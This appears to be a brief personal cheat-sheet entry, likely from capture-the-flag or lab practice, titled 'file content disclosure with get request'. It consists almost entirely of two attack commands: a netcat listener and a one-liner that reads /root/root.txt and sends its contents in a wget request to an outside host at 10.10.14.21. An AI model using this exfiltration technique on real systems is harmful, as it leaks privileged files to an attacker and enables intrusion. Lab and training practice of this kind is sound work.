---
publish: true
created: 2026-02-06T17:09:30.723+05:30
modified: 2026-06-22T08:59:40.112+05:30
---

### file content disclosure with get request

```
nc -lnvp 1234
cat /root/root.txt | xargs -I {} wget http://10.10.14.21:1234/{}
```
